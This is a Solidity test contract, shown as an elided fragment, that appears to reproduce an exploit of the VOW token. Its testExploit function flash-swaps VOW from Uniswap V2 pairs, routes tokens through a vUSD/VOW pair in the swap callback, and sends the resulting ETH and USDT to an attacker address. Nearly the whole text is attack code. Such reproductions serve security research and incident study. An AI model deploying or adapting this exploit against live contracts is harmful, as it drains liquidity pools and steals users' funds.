...
contract VOW is Test {
    ...
    function testExploit() public {
        ...
        IUniswapV2Pair(VOW_WETH_Pair).swap(vowBalance - 1, 0, address(this), hex"00");

        vowBalance = IERC20(vow).balanceOf(address(this));
        IERC20(vow).transfer(attacker, vowBalance / 10);
        (uint112 reserve0, uint112 reserve1,) = IUniswapV2Pair(VOW_WETH_Pair).getReserves();
        vowBalance = IERC20(vow).balanceOf(address(this));
        ...
        IUniswapV2Pair(VOW_WETH_Pair).swap(0, amount1Out, address(this), hex"");
        IWETH(payable(weth)).withdraw(amount1Out);
        (bool success,) = attacker.call{value: amount1Out}("");
        require(success, "Fail to send eth");

        (reserve0, reserve1,) = IUniswapV2Pair(VOW_USDT_Pair).getReserves();
        ...
        IUniswapV2Pair(VOW_USDT_Pair).swap(0, amount1Out, address(this), hex"");
        (success,) = usdt.call(
    ...
    function uniswapV2Call(address sender, uint256 amount0, uint256, bytes calldata) external {
        ...
        (uint112 reserve0, uint112 reserve1,) = IUniswapV2Pair(vUSD_VOW_Pair).getReserves();
        IERC20(vUSD).transfer(vUSD_VOW_Pair, vUSDBalance);

        uint256 amount0In = IERC20(vUSD).balanceOf(vUSD_VOW_Pair) - reserve0;
        uint256 amount1Out = getAmount1Out(reserve0, reserve1, amount0In);
        IUniswapV2Pair(vUSD_VOW_Pair).swap(0, amount1Out, address(this), hex"");
